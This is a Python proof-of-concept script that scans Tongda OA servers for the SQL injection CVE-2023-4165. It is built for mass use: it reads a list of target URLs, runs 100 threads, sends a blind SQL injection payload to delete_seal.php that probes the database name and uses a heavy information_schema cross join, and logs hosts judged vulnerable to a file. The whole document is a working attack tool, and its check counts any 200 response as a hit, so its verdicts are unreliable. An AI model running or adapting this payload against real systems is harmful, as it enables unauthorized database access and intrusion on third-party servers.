#通达OA sql注入漏洞 CVE-2023-4165
#导包外置
import requests,argparse,sys
from multiprocessing.dummy import Pool
# 关闭告警
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ /$$$$$$$$ /$$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$  /$$      
|__  $$__/| $$__  $$ /$$__  $$ /$$__  $$ /$$__  $$ /$$__  $$| $$      
   | $$   | $$  \ $$| $$  \ $$| $$  \ $$| $$  \__/| $$  \ $$| $$      
   | $$   | $$  | $$| $$  | $$| $$$$$$$$|  $$$$$$ | $$  | $$| $$      
   | $$   | $$  | $$| $$  | $$| $$__  $$ \____  $$| $$  | $$| $$      
   | $$   | $$  | $$| $$  | $$| $$  | $$ /$$  \ $$| $$/$$ $$| $$      
   | $$   | $$$$$$$/|  $$$$$$/| $$  | $$|  $$$$$$/|  $$$$$$/| $$$$$$$$
   |__/   |_______/  \______/ |__/  |__/ \______/  \____ $$$|________/
                                                             author :CHKer
                                                             version:1.0.0
  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="通达OA sql注入漏洞 CVE-2023-4165")
    parser.add_argument('-u', '--url', dest='url', type=str, help=' input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = "/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101Firefox/116.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zhHK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers,timeout=10,verify=False,proxies=proxies)
        if res1.status_code == 200:
            print(f"[+]该url:{target}存在漏洞")
            with open('result46.txt','a', encoding='utf-8') as fp:
                fp.write(f"{target}"+"\n")
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}该站点存在问题')

if __name__ == '__main__':
    main()